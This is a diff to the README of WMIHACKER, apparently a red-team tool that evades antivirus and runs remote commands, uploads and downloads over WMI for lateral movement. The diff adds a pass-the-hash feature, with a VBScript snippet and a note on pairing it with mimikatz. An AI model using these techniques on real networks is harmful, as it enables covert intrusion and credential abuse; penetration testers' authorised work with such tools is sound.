@@ -7,9 +7,22 @@
 
 介绍：免杀横向渗透远程命令执行，常见的WMIEXEC、PSEXEC执行命令是创建服务或调用Win32_Process.create执行命令，这些方式都已经被杀软100%拦截，通过改造出WMIHACKER免杀横向移动测试工具。(无需445端口)
 
-主要功能：1、命令执行；2、文件上传；3、文件下载
+主要功能：1、命令执行；2、文件上传；3、文件下载；4、PTH使用
 
 ## 使用
+合并[Issue 1](https://github.com/360-Linton-Lab/WMIHACKER/issues/1)里PTH的使用方法：
+
+```vbscript
+第54-58行代码：
+
+if user = "-" And pass = "-" Then
+set objWMIService = objLocator.connectserver(host,"root/cimv2")
+Set SubobjSWbemServices = objLocator.ConnectServer(host, "root\subscription")
+Set regWMIService = objLocator.ConnectServer(host, "root\default")
+
+用户名和密码填“-”，结合mimikatz的PTH就可以进行WMI的PTH了。
+```
+
 ```
 C:\Users\administrator\Desktop>cscript //nologo WMIHACKER_0.6.vbs
 
